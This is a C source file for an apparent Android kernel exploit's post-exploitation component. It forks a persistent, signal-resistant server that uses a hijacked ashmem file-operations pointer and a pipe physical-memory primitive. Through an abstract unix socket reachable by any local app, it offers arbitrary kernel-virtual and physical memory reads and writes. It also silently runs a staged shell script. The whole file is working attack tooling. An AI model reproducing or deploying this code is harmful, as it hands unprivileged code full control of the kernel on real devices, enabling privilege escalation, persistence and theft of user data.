/* physrw_server.c — persistent physical/kernel-memory service.
 *
 * Forked (detached) from the payload process after a successful exploit.
 * Inherits the prepared pipe physrw state and the fops-driven
 * kernel_read_data/kernel_write_data fd, then serves a length-prefixed
 * binary protocol over a unix socket so external tooling can drive
 * kernel-virtual and physical memory access.
 *
 * Protocol (all little-endian):
 *   request:  u32 magic=0x50525753, u8 cmd, u8 pad[3], u64 addr, u32 len,
 *             [len bytes payload for writes]
 *   response: u32 status(0=ok), u32 len, [len bytes]
 *   cmds: 1=PING 2=VREAD64 3=VWRITE64 4=VREAD 5=VWRITE 6=PREAD 7=PWRITE
 *
 * V* use kernel virtual addresses (fops primitive, works on MMIO vaddrs).
 * P* use physical addresses (pipe physrw, RAM only, must stay in page).
 */
#include "common.h"

#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

/* Provided by pipe.c; the fd whose fops drive kernel_read/write_data. */
extern int g_physrw_fd;

static uint64_t g_fops_slot_addr;   /* &ashmem_fops (kernel global) */
static uint64_t g_fops_original;    /* original ashmem_fops value */

#define PWRS_LOG_PATH "/data/local/tmp/physrw.log"

static void log_signal_only(int sig) {
  int log_fd = open(PWRS_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0666);
  if (log_fd >= 0) {
    dprintf(log_fd, "server got signal %d — ignored\n", sig);
    close(log_fd);
  }
}

static void restore_on_signal(int sig) {
  int log_fd = open(PWRS_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0666);
  if (log_fd >= 0) {
    dprintf(log_fd, "server got signal %d — restoring fops, exiting\n", sig);    close(log_fd);
  }
  if (g_fops_slot_addr && g_fops_original) {
    kernel_write_data(g_physrw_fd, (uintptr_t)g_fops_slot_addr,
                      &g_fops_original, sizeof(g_fops_original));
  }
  _exit(9);
}

#define PWRS_MAGIC 0x50525753u
#define PWRS_SOCK_PATH "/data/local/tmp/.physrw.sock"
#define PWRS_MAX_LEN 4096

enum {
  PWRS_PING = 1,
  PWRS_VREAD64 = 2,
  PWRS_VWRITE64 = 3,
  PWRS_VREAD = 4,
  PWRS_VWRITE = 5,
  PWRS_PREAD = 6,
  PWRS_PWRITE = 7,
};

static int read_full(int fd, void *buf, size_t len) {
  size_t got = 0;
  while (got < len) {
    ssize_t n = read(fd, (char *)buf + got, len - got);
    if (n < 0) {
      if (errno == EINTR) continue;
      return 0;
    }
    if (n == 0) return 0;
    got += (size_t)n;
  }
  return 1;
}

static int write_full(int fd, const void *buf, size_t len) {
  size_t put = 0;
  while (put < len) {
    ssize_t n = write(fd, (const char *)buf + put, len - put);
    if (n < 0) {
      if (errno == EINTR) continue;
      return 0;
    }
    put += (size_t)n;
  }
  return 1;
}

static void send_response(int fd, uint32_t status, const void *data,
                          uint32_t len) {
  uint32_t hdr[2] = {status, len};
  if (!write_full(fd, hdr, sizeof(hdr))) return;
  if (len && data) write_full(fd, data, len);
}

static void handle_client(int cfd) {
  struct ucred peer;
  socklen_t peer_len = sizeof(peer);
  int peer_pid = -1, peer_uid = -1;
  if (getsockopt(cfd, SOL_SOCKET, SO_PEERCRED, &peer, &peer_len) == 0) {
    peer_pid = peer.pid;
    peer_uid = peer.uid;
    pr_info("client connect pid=%d uid=%d gid=%d\n",
            peer.pid, peer.uid, peer.gid);
  }
  for (;;) {
    uint32_t req[8];
    if (!read_full(cfd, req, sizeof(req))) return;
    if (req[0] != PWRS_MAGIC) {
      pr_warning("client pid=%d bad magic %08x\n", peer_pid, req[0]);
      return;
    }

    uint8_t cmd = req[1] & 0xff;
    uint64_t addr = 0;
    uint32_t len = req[7];
    memcpy(&addr, &req[2], sizeof(addr));
    pr_info("client pid=%d uid=%d cmd=%u addr=%016llx len=%u\n",
            peer_pid, peer_uid, cmd, (unsigned long long)addr, len);
    if (len > PWRS_MAX_LEN) {
      send_response(cfd, 2, NULL, 0);
      return;
    }

    uint8_t buf[PWRS_MAX_LEN];
    uint64_t value64 = 0;
    int ok = 0;
    uint32_t rlen = 0;

    switch (cmd) {
      case PWRS_PING:
        ok = 1;
        break;

      case PWRS_VREAD64:
        ok = kernel_read_data(g_physrw_fd, (uintptr_t)addr, &value64,
                              sizeof(value64)) == (ssize_t)sizeof(value64);
        if (ok) {
          memcpy(buf, &value64, sizeof(value64));
          rlen = sizeof(value64);
        }
        break;

      case PWRS_VWRITE64: {
        uint64_t val;
        if (!read_full(cfd, &val, sizeof(val))) return;
        ok = kernel_write_data(g_physrw_fd, (uintptr_t)addr, &val,
                               sizeof(val)) == (ssize_t)sizeof(val);
        break;
      }

      case PWRS_VREAD:
        ok = kernel_read_data(g_physrw_fd, (uintptr_t)addr, buf, len) ==
             (ssize_t)len;
        if (ok) rlen = len;
        break;

      case PWRS_VWRITE:
        if (!read_full(cfd, buf, len)) return;
        ok = kernel_write_data(g_physrw_fd, (uintptr_t)addr, buf, len) ==
             (ssize_t)len;
        break;

      case PWRS_PREAD:
        ok = pipe_phys_read_data(g_physrw_fd, (uintptr_t)addr, buf, len);
        if (ok) rlen = len;
        break;

      case PWRS_PWRITE:
        if (!read_full(cfd, buf, len)) return;
        ok = pipe_phys_write_data(g_physrw_fd, (uintptr_t)addr, buf, len);
        break;

      default:
        send_response(cfd, 1, NULL, 0);
        return;
    }

    send_response(cfd, ok ? 0 : 3, buf, rlen);
  }
}

static void server_loop(void) {
  int log_fd = open(PWRS_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0666);
  if (log_fd >= 0) {
    dprintf(log_fd, "server enter uid=%d fd=%d logfd=%d errno=%d\n",
            (int)getuid(), g_physrw_fd, log_fd, errno);
    if (log_fd != g_physrw_fd) {
      dup2(log_fd, 1);
      dup2(log_fd, 2);
      if (log_fd > 2) close(log_fd);
    }
  }

  int sfd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (log_fd >= 0) dprintf(log_fd, "socket=%d errno=%d\n", sfd, errno);
  if (sfd < 0) _exit(3);

  /* ABSTRACT namespace socket: no filesystem perms needed (app-uid safe) */
  struct sockaddr_un sa;
  memset(&sa, 0, sizeof(sa));
  sa.sun_family = AF_UNIX;
  sa.sun_path[0] = 0;
  strncpy(sa.sun_path + 1, "physrw", sizeof(sa.sun_path) - 2);
  socklen_t salen = (socklen_t)(sizeof(sa.sun_family) + 1 + strlen("physrw"));
  if (bind(sfd, (struct sockaddr *)&sa, salen) != 0) {
    if (log_fd >= 0) dprintf(log_fd, "bind fail errno=%d\n", errno);
    _exit(3);
  }
  if (listen(sfd, 4) != 0) {
    if (log_fd >= 0) dprintf(log_fd, "listen fail errno=%d\n", errno);
    _exit(3);
  }

  dprintf(1, "physrw-server ready pid=%d fd=%d\n", getpid(), g_physrw_fd);

  if (access("/data/local/tmp/burst.sh", X_OK) == 0) {
    if (fork() == 0) {
      int dn = open("/dev/null", O_RDWR);
      if (dn >= 0) { dup2(dn, 0); dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
      execl("/system/bin/sh", "sh", "/data/local/tmp/burst.sh", (char *)NULL);
      _exit(127);
    }
  }

  for (;;) {
    int cfd = accept(sfd, NULL, NULL);
    if (cfd < 0) {
      if (errno == EINTR) continue;
      _exit(4);
    }
    handle_client(cfd);
    close(cfd);
  }
}

void physrw_server_launch(int fd, uint64_t fops_slot, uint64_t fops_orig) {
  g_physrw_fd = fd;
  g_fops_slot_addr = fops_slot;
  g_fops_original = fops_orig;
  signal(SIGTERM, restore_on_signal);
  signal(SIGINT, restore_on_signal);
  signal(SIGQUIT, restore_on_signal);
  /* Log-and-survive everything else catchable so physrw.log names any
   * future killer (KILL/STOP cannot be caught). */
  for (int sig = 1; sig < 32; sig++) {
    if (sig == SIGKILL || sig == SIGSTOP || sig == SIGTERM ||
        sig == SIGINT || sig == SIGQUIT) {
      continue;
    }
    signal(sig, log_signal_only);
  }
  server_loop();  /* never returns */
}
